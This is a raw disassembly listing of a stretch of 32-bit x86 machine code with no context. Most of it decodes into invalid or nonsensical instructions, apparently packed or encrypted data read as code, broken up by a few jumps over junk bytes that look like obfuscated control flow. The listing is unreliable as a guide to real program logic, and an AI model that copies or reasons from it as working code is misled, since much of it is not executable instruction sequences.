  406bf9:	adc    eax,0x91215eb1
  406bfe:	div    DWORD PTR [edx]
  406c00:	lea    esp,[edx-0x64f928b2]
  406c06:	pop    ds
  406c07:	xchg   esi,eax
  406c08:	pop    ss
  406c09:	push   es
  406c0a:	push   esp
  406c0b:	test   DWORD PTR [esp+ebx*2-0x3a],0x6ec9044f
  406c13:	adc    ch,BYTE PTR [eax]
  406c15:	out    0xdd,al
  406c17:	jle    0x406c7b
  406c19:	les    ebx,FWORD PTR [edi-0x15]
  406c1c:	fadd   DWORD PTR [edi+0xe134cbe]
  406c22:	jg     0x406c41
  406c24:	pop    ss
  406c25:	shl    DWORD PTR [ecx+0xd],0x99
  406c29:	push   ebx
  406c2a:	fucom  st(2)
  406c2c:	push   edi
  406c2d:	lods   eax,DWORD PTR ds:[esi]
  406c2e:	fwait
  406c2f:	retf   0xf145
  406c32:	and    bh,dl
  406c34:	mov    dl,0x5a
  406c36:	adc    ebp,edi
  406c38:	sub    eax,0x754e6304
  406c3d:	imul   ebx,DWORD PTR [ecx],0x2d
  406c40:	imul   ecx,DWORD PTR [ecx],0x2421dbff
  406c46:	push   ds
  406c47:	pop    esp
  406c48:	mov    ebp,0x29126c33
  406c4d:	aas    
  406c4e:	cwde   
  406c4f:	jne    0x406c3f
  406c51:	test   BYTE PTR [esi],bl
  406c53:	ins    BYTE PTR es:[edi],dx
  406c54:	test   DWORD PTR [ebx-0x5aecd196],ebp
  406c5a:	test   eax,0xbafb92df
  406c5f:	add    eax,0x948b50d8
  406c64:	xchg   ebx,eax
  406c65:	xchg   esp,eax
  406c66:	stc    
  406c67:	dec    eax
  406c68:	jnp    0x406c2d
  406c6a:	mov    ecx,0xcf969326
  406c6f:	dec    ebp
  406c70:	in     al,dx
  406c71:	test   BYTE PTR [edi-0x17bf3e14],dh
  406c77:	dec    esp
  406c78:	cwde   
  406c79:	push   esi
  406c7a:	test   DWORD PTR [eax-0x12],eax
  406c7d:	div    DWORD PTR [ebp+0x5a]
  406c80:	fldcw  WORD PTR [esi+edx*8-0x4fc67d7f]
  406c87:	out    dx,eax
  406c88:	shl    al,cl
  406c8a:	aad    0x17
  406c8c:	cmc    
  406c8d:	scas   al,BYTE PTR es:[edi]
  406c8e:	stos   BYTE PTR es:[edi],al
  406c8f:	sub    DWORD PTR [ecx],esp
  406c91:	in     eax,dx
  406c92:	imul   ebp,DWORD PTR [ebx],0x8bbd2123
  406c98:	fxch   st(6)
  406c9a:	mov    eax,DWORD PTR [edx-0x13]
  406c9d:	mov    al,ds:0x2848cd00
  406ca2:	sbb    eax,0x772a7b28
  406ca7:	rcl    DWORD PTR [eax+0x3c],1
  406caa:	jl     0x406c52
  406cac:	mov    edx,0xb7f49160
  406cb1:	cli    
  406cb2:	xor    eax,0xe664a43
  406cb7:	push   ss
  406cb8:	xor    BYTE PTR [ebx+0x30238cf6],ch
  406cbe:	je     0x406c71
  406cc0:	xor    eax,0xe1e148a8
  406cc5:	fdiv   DWORD PTR es:[ecx-0x20]
  406cc9:	inc    esi
  406cca:	mov    eax,ds:0x8eb1635b
  406ccf:	and    DWORD PTR [edi],edx
  406cd1:	push   0xffffffe5
  406cd3:	mov    dh,0xc6
  406cd5:	inc    esp
  406cd6:	pop    ebp
  406cd7:	and    BYTE PTR [ecx-0x7a4e1436],bh
  406cdd:	test   BYTE PTR [eax],0x95
  406ce0:	ins    BYTE PTR es:[edi],dx
  406ce1:	cmp    dl,BYTE PTR [ebp+0x43]
  406ce4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ce5:	loope  0x406cbd
  406ce7:	mov    WORD PTR [ecx+0x2a0fa013],cs
  406ced:	enter  0xd703,0x75
  406cf1:	loop   0x406d50
  406cf3:	ins    DWORD PTR es:[edi],dx
  406cf4:	ja     0x406cb3
  406cf6:	or     dh,dh
  406cf8:	xchg   ebx,eax
  406cf9:	(bad)  
  406cfa:	mov    al,ds:0x83df5367
  406cff:	aam    0xc4
  406d01:	add    eax,0x41c04e
  406d06:	out    0xfd,al
  406d08:	dec    esp
  406d09:	aaa    
  406d0a:	or     eax,0x84068306
  406d0f:	sub    eax,0x72ef21f8
  406d14:	out    dx,al
  406d15:	mov    cl,BYTE PTR [edi+0x379b73c]
  406d1b:	inc    ebx
  406d1c:	adc    al,0x7c
  406d1e:	mov    al,ds:0x8ed3ad5c
  406d23:	arpl   WORD PTR [edx+0x51],bp
  406d26:	(bad)  
  406d27:	dec    ebx
  406d28:	mov    DWORD PTR [edx+0x4d],ebx
  406d2b:	xor    DWORD PTR [edx],ebx
  406d2d:	hlt    
  406d2e:	adc    cl,BYTE PTR [edi]
  406d30:	aad    0x43
  406d32:	lock and ah,BYTE PTR [ebx-0x4e]
  406d36:	ins    DWORD PTR es:[edi],dx
  406d37:	fisub  DWORD PTR ds:0x2d998a48
  406d3d:	mov    al,ds:0x717e7ee1
  406d42:	sahf   
  406d43:	jg     0x406daa
  406d45:	mov    bl,0xe8
  406d47:	in     al,dx
  406d48:	sbb    eax,0x753c7a99
  406d4d:	pop    ds
  406d4e:	inc    ebx
  406d4f:	repz xor ax,cx
  406d53:	mov    ecx,0x3b02
  406d58:	sbb    DWORD PTR ds:0x43372f,0x433613
  406d62:	add    ax,cx
  406d65:	add    DWORD PTR ds:0x433723,0x7d57
  406d6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d72:	movzx  eax,ax
  406d75:	sbb    DWORD PTR ds:0x433663,0x43360f
  406d7f:	jmp    0x406f5e
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0x35
  406d91:	xor    ecx,DWORD PTR [edx-0x5]
  406d94:	inc    eax
  406d95:	cmp    BYTE PTR [esi+0x7e],bh
  406d98:	mov    esp,0xd7e7e7f
  406d9d:	das    
  406d9e:	stc    
  406d9f:	lea    esi,[eax+0x3e]
  406da2:	mov    WORD PTR fs:[esi+0x71],ss
  406da6:	add    BYTE PTR [edx],bh
  406da8:	mov    al,0x9b
  406daa:	outs   dx,DWORD PTR ds:[esi]
  406dab:	mov    ecx,0x98ab9617
  406db0:	pop    esi
  406db1:	xchg   DWORD PTR [ecx-0x23],edx
  406db4:	ficomp WORD PTR [ebx+0x2183e396]
  406dba:	jae    0x406d68
  406dbc:	cmp    bl,ah
  406dbe:	bound  ecx,QWORD PTR ds:0xbf6ba96
  406dc4:	test   BYTE PTR [ebx],bh
  406dc6:	pop    eax
  406dc7:	xlat   BYTE PTR ds:[ebx]
  406dc8:	sti    
  406dc9:	pop    ss
  406dca:	add    dl,BYTE PTR [edi+0x2c56a15f]
  406dd0:	rcl    dh,0x46
  406dd3:	inc    edx
  406dd4:	into   
  406dd5:	inc    eax
  406dd6:	cli    
  406dd7:	jnp    0x406e0c
  406dd9:	push   ebx
  406dda:	pop    ecx
  406ddb:	lock add al,0x1b
  406dde:	pusha  
  406ddf:	rcl    DWORD PTR [edi],0xbb
  406de2:	pop    esi
  406de3:	inc    eax
  406de4:	cmp    eax,0x5ae7234a
  406de9:	mov    al,0xe0
  406deb:	xchg   dl,ah
  406ded:	or     DWORD PTR [eax+edx*8+0x22],ecx
  406df1:	(bad)  
  406df2:	sub    al,0xd3
  406df4:	pusha  
  406df5:	repz rcr ah,cl
  406df8:	cmp    eax,0xd8a0f50e
  406dfd:	xchg   esi,esp
  406dff:	jb     0x406dea
  406e01:	lea    esi,[ecx+0x0]
  406e04:	sbb    eax,0x8c18fddd
  406e09:	gs push ds
  406e0b:	cld    
  406e0c:	add    DWORD PTR [ecx],eax
  406e0e:	xchg   esi,eax
  406e0f:	push   0x14859be7
  406e14:	imul   eax,DWORD PTR [edi+0x54a28250],0xffffffbd
  406e1b:	fistp  DWORD PTR [ecx-0x1]
  406e1e:	test   eax,0xb1d9ccce
  406e23:	inc    esp
  406e24:	xchg   ebp,esp
  406e26:	jne    0x406df0
  406e28:	mov    dl,0x26
  406e2a:	add    DWORD PTR [eax],esp
  406e2c:	(bad)  [esi+0x65c12869]
  406e32:	aas    
  406e33:	jmpw   0x2d18
  406e37:	loop   0x406df6
  406e39:	pop    DWORD PTR [edi+0x32d2ad2e]
  406e3f:	jne    0x406e73
  406e41:	fst    DWORD PTR [edx-0x2f]
  406e44:	xor    bh,BYTE PTR [eax]
  406e46:	aaa    
  406e47:	cmp    dl,BYTE PTR [edi]
  406e49:	inc    eax
  406e4a:	int3   
  406e4b:	mov    ecx,0xc91bd67e
  406e50:	pop    ebx
  406e51:	or     DWORD PTR [ebx+ebp*4+0x47c33cf8],ebx
  406e58:	xchg   ebx,eax
  406e59:	bound  ecx,QWORD PTR [esi+0x29]
  406e5c:	xchg   esp,eax
  406e5d:	mov    es,ebx
  406e5f:	aas    
  406e60:	xchg   edi,eax
  406e61:	cwde   
  406e62:	retf   0x4efa
  406e65:	addr16 cdq 
  406e67:	sbb    dl,BYTE PTR [eax+0x5b]
  406e6a:	lods   eax,DWORD PTR ds:[esi]
  406e6b:	popf   
  406e6c:	lock mov ch,0x7d
  406e6f:	xchg   ebx,eax
  406e70:	and    DWORD PTR [edx],eax
  406e72:	popf   
  406e73:	mov    al,ds:0x3283e21e
  406e78:	push   edi
  406e79:	cmp    ah,bh
  406e7b:	(bad)  
  406e7c:	out    dx,al
  406e7d:	in     ax,0x8b
  406e80:	inc    eax
  406e81:	push   0xffffffc1
  406e83:	fmul   QWORD PTR [esi]
  406e85:	jl     0x6232fd82
  406e8b:	xor    eax,0xc5500534
  406e90:	mov    gs,WORD PTR [eax+0x517e7ee5]
  406e96:	dec    esi
  406e97:	mov    edi,0x581585f1
  406e9c:	sbb    bl,BYTE PTR [edi+ebx*2-0x46e8d471]
  406ea3:	adc    ecx,esi
  406ea5:	imul   ecx,DWORD PTR [edx+0x56e0140a],0x7a
  406eac:	ja     0x406f15
  406eae:	cmp    BYTE PTR [ebx+ebx*4+0xbc95d7b],0x2e
  406eb6:	int3   
  406eb7:	jno    0x406f04
  406eb9:	dec    ebp
  406eba:	cs pop ss
  406ebc:	icebp  
  406ebd:	xchg   edx,eax
  406ebe:	mov    dh,BYTE PTR [esi-0x7]
  406ec1:	lods   al,BYTE PTR ds:[esi]
  406ec2:	in     eax,dx
  406ec3:	fsubr  st,st(1)
  406ec5:	out    dx,al
  406ec6:	fxch   st(3)
  406ec8:	xor    BYTE PTR [edx],ah
  406eca:	cmp    BYTE PTR [ebp-0x59],bh
  406ecd:	(bad)  
  406ece:	mov    esp,0x8ffa8b3c
  406ed3:	pushf  
  406ed4:	mov    edi,0x7e488ed5
  406ed9:	adc    DWORD PTR [edx],ecx
  406edb:	pusha  
  406edc:	data16 sub ah,BYTE PTR [ecx-0x31ffa3c8]
  406ee3:	dec    BYTE PTR [eax]
  406ee5:	inc    esp
  406ee6:	push   eax
  406ee8:	in     eax,0x5a
  406eea:	rol    DWORD PTR [esp+eax*4+0x6e],cl
  406eee:	retf   0xe58
  406ef1:	stos   BYTE PTR es:[edi],al
  406ef2:	push   ebx
  406ef3:	inc    esp
  406ef4:	jae    0x406e93
  406ef6:	jg     0x406f38
  406ef8:	mov    DWORD PTR [eax+0x15],edx
  406efb:	sar    BYTE PTR ds:0x7715ee9,1
  406f01:	sbb    cl,bh
  406f03:	or     al,dl
  406f05:	xchg   esi,eax
  406f06:	jg     0x406ec4
  406f08:	sbb    bl,ah
  406f0a:	xchg   BYTE PTR [esi-0x37],dh
  406f0d:	adc    ah,BYTE PTR cs:[ebp+ebp*1-0x1d29c23f]
  406f15:	mov    esp,0x5c61a072
  406f1a:	push   ss
  406f1b:	mov    bl,0x9c
  406f1d:	(bad)  
  406f1e:	outs   dx,DWORD PTR ds:[esi]
  406f1f:	inc    ebx
  406f20:	loope  0x406f6c
  406f22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f23:	cdq    
  406f24:	adc    eax,0xf5894092
  406f29:	pop    edx
  406f2a:	cmp    BYTE PTR [eax-0x62],ah
  406f2d:	das    
  406f2e:	inc    edi
  406f2f:	push   ecx
  406f30:	adc    BYTE PTR [ecx-0x4db85773],dh
  406f36:	lock cs std 
  406f39:	aam    0xaa
  406f3b:	jb     0x406f8f
  406f3d:	pusha  
  406f3e:	test   BYTE PTR [eax+edi*2+0x5f],bh
  406f42:	or     eax,0x3ba808be
  406f47:	enter  0x422d,0x8a
  406f4b:	xor    edi,DWORD PTR [eax]
  406f4d:	dec    ecx
  406f4e:	mov    ebp,0x508abb59
  406f53:	mov    DWORD PTR ds:0x6905759,eax
  406f59:	jecxz  0x406eea
  406f5b:	and    BYTE PTR [ebx+0x34],0xf7
  406f5f:	rol    BYTE PTR [ecx+0x43360f25],1
  406f65:	add    BYTE PTR [ebx+0x36],dl
  406f68:	inc    ebx
  406f69:	add    BYTE PTR [ebx],ah
  406f6b:	add    DWORD PTR [ebx+0x189084d],ecx
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0x7c73a601
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0xfc7e7e7f
  406f9f:	adc    BYTE PTR [edx+0x28],bh
  406fa2:	cmp    BYTE PTR ds:0x446a4ae9,0xe0
  406fa9:	xor    DWORD PTR [edi],0xa61a454d
  406faf:	jbe    0x406f73
  406fb1:	jne    0x407002
  406fb3:	pop    esi
  406fb4:	ja     0x406f68
  406fb6:	nop
  406fb7:	scas   eax,DWORD PTR es:[edi]
  406fb8:	aad    0x18
  406fba:	je     0x406fc5
  406fbc:	inc    eax
  406fbd:	add    bl,BYTE PTR ss:[ecx+0x7a]
  406fc1:	nop
  406fc2:	push   ebx
  406fc3:	inc    ebx
  406fc4:	pushf  
  406fc5:	xor    ebx,DWORD PTR [edx]
  406fc7:	push   ecx
  406fc8:	aaa    
  406fc9:	mov    ds:0x61c7f8b7,eax
  406fce:	and    ch,BYTE PTR [ebx-0x12d76b5]
  406fd4:	mov    ah,BYTE PTR [ebp+0x74]
  406fd7:	xchg   DWORD PTR [ecx+esi*2-0x3e5785bf],esp
  406fde:	cmp    al,0xa8
  406fe0:	jge    0x406fab
  406fe2:	jno    0x406f7d
  406fe4:	mov    ecx,0x6459f2a6
  406fe9:	pop    esp
  406fea:	xchg   dh,al
  406fec:	inc    edx
  406fed:	adc    esp,DWORD PTR [esi-0x4b592f63]
  406ff3:	std    
  406ff4:	cmc    
  406ff5:	pop    esp
  406ff6:	pop    ds
  406ff7:	add    eax,DWORD PTR [ecx]
  406ff9:	cmp    bh,dl
  406ffb:	mov    ebx,0xe91487ff
  407000:	and    al,BYTE PTR [eax]
  407002:	inc    ebx
  407003:	and    al,0xf5
  407005:	pop    ds
  407006:	sbb    dh,ch
  407008:	cmp    dl,BYTE PTR [esi]
  40700a:	outs   dx,DWORD PTR ds:[esi]
  40700b:	imul   edx,DWORD PTR [edi+0x1d071b8e],0xffffffb8
  407012:	fs daa 
  407014:	das    
  407015:	pop    ebx
  407016:	sbb    ah,dh
  407018:	cmp    edi,DWORD PTR [ecx+0x2d55e2b4]
  40701e:	cmp    eax,0xaa1a6933
  407023:	push   0x59
  407025:	push   esp
  407026:	fs fs dec edx
  407029:	sbb    ebx,DWORD PTR ds:[ebp+0x79262b46]
  407030:	out    0xfb,al
  407032:	cli    
  407033:	jmp    0x407076
  407035:	(bad)  
  407036:	(bad)  
  407037:	jns    0x407071
  407039:	mov    cl,0x28
  40703b:	ss loop 0x406fdf
  40703e:	cld    
  40703f:	stc    
  407040:	fist   DWORD PTR ds:0x8582e7a7
  407046:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407047:	add    al,0x47
  407049:	fbld   TBYTE PTR [edi+0x65]
  40704c:	nop
  40704d:	add    esi,DWORD PTR [ebp-0x75f1132d]
  407053:	xlat   BYTE PTR ds:[ebx]
  407054:	xor    DWORD PTR [edx-0x6199c126],ebx
  40705a:	inc    esi
  40705b:	xchg   ecx,eax
  40705c:	clc    
  40705d:	jb     0x4070b6
  40705f:	sub    bh,dh
  407061:	sub    bh,BYTE PTR [ebp+0x7a]
  407064:	es div edi
  407067:	xchg   edi,eax
  407068:	test   dh,ah
  40706a:	jmp    0x40705e
  40706c:	pusha  
  40706d:	repz pop esi
  40706f:	push   0x488d44bd
  407074:	scas   al,BYTE PTR es:[edi]
  407075:	mov    bh,0x16
  407077:	push   edi
  407078:	out    dx,eax
  407079:	int    0x5c
  40707b:	iret   
  40707c:	xchg   ebp,eax
  40707d:	cld    
  40707e:	dec    ebx
  40707f:	pop    ecx
  407080:	pop    ss
  407081:	sbb    esi,DWORD PTR [eax]
  407083:	dec    esp
  407084:	adc    DWORD PTR [esi+0xfd4a9f6],ecx
  40708a:	into   
  40708b:	adc    bl,al
  40708d:	je     0x40708a
  40708f:	push   ebp
  407090:	aas    
  407091:	in     eax,dx
  407092:	outs   dx,DWORD PTR ds:[esi]
  407093:	(bad)  
  407094:	ja     0x4070e0
  407096:	(bad)  
  407097:	nop
  407098:	pop    ds
  407099:	and    eax,0x42aedf02
  40709e:	and    DWORD PTR [ebx],esi
  4070a0:	enter  0x5f0a,0xa
  4070a4:	cmp    DWORD PTR ds:0x14c6c8e5,edi
  4070aa:	jp     0x407067
  4070ac:	inc    ebx
  4070ad:	lds    edi,FWORD PTR [eax+esi*8-0x39429689]
  4070b4:	rcr    ch,1
  4070b6:	test   DWORD PTR [esi-0x11],esp
  4070b9:	aam    0x4d
  4070bb:	and    DWORD PTR [edx+0x159ce994],0x17b7052e
  4070c5:	pop    ebp
  4070c6:	es in  al,0xb2
  4070c9:	sub    al,0xaf
  4070cb:	ja     0x407128
  4070cd:	inc    edi
  4070ce:	or     eax,0x4670eb3a
  4070d3:	repz pop eax
  4070d5:	mov    ss,WORD PTR [eax]
  4070d7:	inc    esi
  4070d8:	fnstsw WORD PTR [ecx-0x4488b419]
  4070de:	jecxz  0x4070e9
  4070e0:	outs   dx,DWORD PTR ds:[esi]
  4070e1:	push   ebx
  4070e2:	pop    es
  4070e3:	jecxz  0x40707a
  4070e5:	int3   
  4070e6:	scas   eax,DWORD PTR es:[edi]
  4070e7:	cvtpi2ps xmm7,QWORD PTR [eax+0x4d]
  4070eb:	mov    ah,0xe
  4070ed:	int3   
  4070ee:	inc    ebx
  4070ef:	leave  
  4070f0:	stos   DWORD PTR es:[edi],eax
  4070f1:	outs   dx,BYTE PTR ds:[esi]
  4070f2:	sbb    DWORD PTR [ebx+0x71],0xffffffe6
  4070f6:	cwde   
  4070f7:	cli    
  4070f8:	xchg   esi,eax
  4070f9:	or     bh,cl
  4070fb:	sub    eax,0xab230620
  407100:	aaa    
  407101:	sub    DWORD PTR [ecx],edi
  407103:	jmp    0x4aec:0xa062cb58
  40710a:	add    DWORD PTR [ebp+0x680c1cf8],ecx
  407110:	and    BYTE PTR [edi-0x6ca6839b],dl
  407116:	fisubr WORD PTR [eax+0x3d]
  407119:	out    dx,eax
  40711a:	fstp   DWORD PTR [esi-0x1ac06f2e]
  407120:	cmp    al,0x91
  407122:	(bad)  
  407123:	js     0x4070e1
  407125:	xchg   ecx,eax
  407126:	cld    
  407127:	jg     0x40715d
  407129:	aad    0xa2
  40712b:	dec    edi
  40712c:	in     al,dx
  40712d:	and    DWORD PTR [ebp-0x52],eax
  407130:	mov    WORD PTR [ebp+edi*4+0x4f],gs
  407134:	div    BYTE PTR [edi-0x1206b884]
  40713a:	pusha  
  40713b:	xor    BYTE PTR [edx],al
  40713d:	and    al,0x38
  40713f:	mov    ecx,0xdb6f9d9c
  407144:	mov    ds:0x7112b96d,al
  407149:	mov    ch,0xdf
  40714b:	inc    edi
  40714c:	pop    ebp
  40714d:	cmp    ebx,esi
  40714f:	or     ecx,DWORD PTR [ebx]
  407151:	fstp   DWORD PTR [esi+0x51]
  407154:	imul   eax,ebp,0xf066d6e1
  40715a:	es pop esp
  40715c:	dec    ebp
  40715d:	pop    ss
  40715e:	sbb    ecx,esp
  407160:	push   DWORD PTR [ebp+0x8]
  407163:	call   0x407353
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	ja     0x407191
  40717d:	push   cs
  40717e:	mov    esp,0x7e7ec4cc
  407183:	mov    esp,0xca7e7e7f
  407188:	dec    ecx
  407189:	ja     0x4071b9
  40718b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40718c:	cmc    
  40718d:	cmp    DWORD PTR [edx+0x373183be],0xbac9d515
  407197:	aam    0xf3
  407199:	repz ret 
  40719b:	pop    edi
  40719c:	push   edx
  40719d:	gs or  al,0x57
  4071a0:	sub    al,0xd0
  4071a2:	mov    ch,0xdb
  4071a4:	mov    DWORD PTR [ebx-0x7c],esi
  4071a7:	stos   BYTE PTR es:[edi],al
  4071a8:	mov    bl,0x93
  4071aa:	addr16 or al,dh
  4071ad:	pop    ebp
  4071ae:	mov    ebx,0x9c1c7381
  4071b3:	xchg   ecx,eax
  4071b4:	or     BYTE PTR [eax-0x4f45bbd],al
  4071ba:	lea    edi,[ebx-0x1e]
  4071bd:	push   edx
  4071be:	mov    ss,WORD PTR [edx]
  4071c0:	cmp    BYTE PTR [ebx-0x69],0xe1
  4071c4:	push   ss
  4071c5:	lock add DWORD PTR [eax-0x67c7d428],0xdd827b6a
  4071d0:	into   
  4071d1:	push   ecx
  4071d2:	dec    ebx
  4071d3:	push   0x3c
  4071d5:	(bad)  
  4071d6:	cdq    
  4071d7:	inc    esi
  4071d8:	lds    esi,FWORD PTR [edx-0x29]
  4071db:	hlt    
  4071dc:	push   DWORD PTR [eax+0x23]
  4071df:	mov    ebx,0xbbf7ecb1
  4071e4:	mov    ss,WORD PTR [edi+0x51]
  4071e7:	cmp    al,0x4
  4071e9:	ins    DWORD PTR es:[edi],dx
  4071ea:	fild   WORD PTR cs:[edx+0x2f]
  4071ee:	mov    esp,0x1d9292d
  4071f3:	fwait
  4071f4:	mov    eax,0x34ba2c8d
  4071f9:	aaa    
  4071fa:	(bad)  [eax+0x1a]
  4071fd:	out    dx,al
  4071fe:	adc    ebp,DWORD PTR [ebx-0x4160c18c]
  407204:	enter  0x9689,0x93
  407208:	stos   DWORD PTR es:[edi],eax
  407209:	fs or  al,0xbb
  40720c:	ret    0x4269
  40720f:	jmp    0x9269:0x2594cdb
  407216:	mov    cl,0xc8
  407218:	and    eax,0xaa19d1e8
  40721d:	adc    edx,DWORD PTR [esi]
  40721f:	inc    edi
  407220:	mov    ecx,0x3e9a39a2
  407225:	or     DWORD PTR [ecx-0x63b84c7d],ecx
  40722b:	ins    DWORD PTR es:[edi],dx
  40722c:	and    edi,DWORD PTR [ecx+edi*1]
  40722f:	mov    ebx,0x2d94fed0
  407234:	es add dh,dh
  407237:	es adc bl,dh
  40723a:	cmp    dl,BYTE PTR [ebx-0x3d2b5133]
  407240:	fwait
  407241:	loopne 0x40728d
  407243:	push   cs
  407244:	lods   al,BYTE PTR ds:[esi]
  407245:	push   ds
  407246:	aad    0x11
  407248:	dec    eax
  407249:	retf   0x9cd3
  40724c:	lahf   
  40724d:	pop    edi
  40724e:	cmc    
  40724f:	shr    cl,0x67
  407252:	push   cs
  407253:	ins    DWORD PTR es:[edi],dx
  407254:	add    DWORD PTR [edi-0xe32343c],ecx
  40725a:	pop    ss
  40725b:	pop    esi
  40725c:	lahf   
  40725d:	icebp  
  40725e:	bnd jbe 0x40727e
  407261:	push   esp
  407262:	test   eax,0xa0f1a0f9
  407267:	dec    ebp
  407268:	jl     0x4072ad
  40726a:	hlt    
  40726b:	xchg   esi,eax
  40726c:	imul   ebp,DWORD PTR [esi],0xf
  40726f:	adc    ch,0x1b
  407272:	add    esi,DWORD PTR [ecx+0x246db489]
  407278:	or     eax,0x72648b23
  40727d:	push   0xffffff87
  40727f:	push   esp
  407280:	xor    ah,BYTE PTR [ecx+0x73]
  407283:	call   0x92ac25a7
  407288:	leave  
  407289:	test   eax,0x3fe96e8d
  40728e:	adc    eax,0x3c6ad989
  407293:	dec    ebx
  407294:	or     edi,ebx
  407296:	sub    al,0xba
  407298:	(bad)  
  407299:	dec    ebx
  40729a:	ret    
  40729b:	outs   dx,BYTE PTR ds:[esi]
  40729c:	dec    edi
  40729d:	mov    ebx,0x8ab5b7d4
  4072a2:	pop    ecx
  4072a3:	dec    ebp
  4072a4:	mov    eax,ds:0x4f61bc08
  4072a9:	jmp    DWORD PTR [edi-0x124f9b72]
  4072af:	int    0x3e
  4072b1:	xchg   esp,eax
  4072b2:	sar    DWORD PTR [edx-0x7a],cl
  4072b5:	fidivr DWORD PTR [ecx-0x8]
  4072b8:	das    
  4072b9:	jo     0x4072c5
  4072bb:	push   ebp
  4072bc:	icebp  
  4072bd:	pop    ds
  4072be:	test   BYTE PTR [esi],cl
  4072c0:	mov    eax,0x3b600f45
  4072c5:	jp     0x40732e
  4072c7:	(bad)  
  4072c8:	dec    ebx
  4072c9:	pop    ebx
  4072ca:	smsw   WORD PTR [edx+0xd832c2a]
  4072d1:	das    
  4072d2:	jb     0x4072f9
  4072d4:	lea    ebp,ds:0x7a93ecfd
  4072da:	sahf   
  4072db:	mov    ecx,0x31268da2
  4072e0:	and    bh,BYTE PTR [ebp+0x78]
  4072e3:	add    BYTE PTR [ebx-0x6],dh
  4072e6:	(bad)  
  4072e7:	fdivr  QWORD PTR [ecx]
  4072e9:	pop    esi
  4072ea:	jg     0x4072fe
  4072ec:	mov    ch,BYTE PTR [esi-0x614f0b83]
  4072f2:	ret    
  4072f3:	cs icebp 
  4072f5:	pop    edi
  4072f6:	es mov eax,fs
  4072f9:	bound  ebx,QWORD PTR [edx-0x37]
  4072fc:	add    eax,0xdee22675
  407301:	(bad)  
  407302:	mov    edi,0x2a4e9125
  407307:	and    DWORD PTR [ebp+ebx*4+0xfc128da],edx
  40730e:	mov    al,0x5a
  407310:	dec    edx
  407311:	loope  0x407295
  407313:	call   0xe4034ccc
  407318:	mov    bl,0xd
  40731a:	hlt    
  40731b:	in     al,dx
  40731c:	scas   al,BYTE PTR es:[edi]
  40731d:	sub    esi,ebp
  40731f:	imul   BYTE PTR [edi+ebx*2-0x5c92d010]
  407326:	repz sahf 
  407328:	dec    esp
  407329:	fs mov dh,0x98
  40732c:	shr    BYTE PTR [ecx-0x48],0x45
  407330:	rol    BYTE PTR [ecx+0x3b],1
  407333:	(bad)  
  407334:	jge    0x4072f4
  407336:	ficom  DWORD PTR [edi+0x67f6a983]
  40733c:	xchg   edx,eax
  40733d:	xchg   ecx,eax
  40733e:	mov    dl,0x76
  407340:	shr    DWORD PTR [eax+0x4b],cl
  407343:	cmp    edi,edi
  407345:	call   0x10266c89
  40734a:	test   BYTE PTR [edi],ah
  40734c:	cld    
  40734d:	(bad)  
  40734e:	dec    ecx
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x433657,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x43372b
  40736f:	or     DWORD PTR ds:0x43372f,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x407310
  407387:	lds    ebp,FWORD PTR [ebx]
  407389:	jo     0x407395
  40738b:	ret    0x7e7e
  40738e:	add    eax,0xeb7e7e7c
  407393:	or     ebp,edx
  407395:	jne    0x4073d4
  407397:	retfw  0xee58
  40739b:	pop    ss
  40739c:	push   ebx
  40739d:	sub    bl,BYTE PTR [esi-0x65f4e08d]
  4073a3:	cmp    eax,DWORD PTR fs:[edi+0x22]
  4073a7:	(bad)  
  4073a8:	out    dx,al
  4073a9:	aad    0x11
  4073ab:	mov    es,esp
  4073ad:	xchg   DWORD PTR [ebx-0x15],esp
  4073b0:	jmp    0x1847:0x4d383fd4
  4073b7:	jmp    0x40734a
  4073b9:	test   BYTE PTR [edx],cl
  4073bb:	add    al,0x1c
  4073bd:	or     ah,BYTE PTR [ebx]
  4073bf:	or     eax,0x5cccb58d
  4073c4:	add    eax,0x528b5538
  4073c9:	or     ebp,0xee9b9675
  4073cf:	jne    0x4073ad
  4073d1:	cs popf 
  4073d3:	adc    al,0xf9
  4073d5:	je     0x4073f6
  4073d7:	iret   
  4073d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073d9:	inc    esi
  4073da:	and    al,0x76
  4073dc:	out    0xc1,al
  4073de:	dec    ecx
  4073df:	push   ebp
  4073e0:	in     al,dx
  4073e1:	jo     0x407441
  4073e3:	loop   0x4073f3
  4073e5:	cmp    BYTE PTR ds:0x9d87a1ab,ah
  4073eb:	scas   al,BYTE PTR es:[edi]
  4073ec:	dec    edi
  4073ed:	mov    bh,0x7c
  4073ef:	inc    edx
  4073f0:	das    
  4073f1:	mov    ebp,0xd2820077
  4073f6:	lahf   
  4073f7:	loop   0x40743b
  4073f9:	test   eax,0x7f796715
  4073fe:	jb     0x4073bc
  407400:	inc    esp
  407401:	push   esi
  407402:	xchg   esp,eax
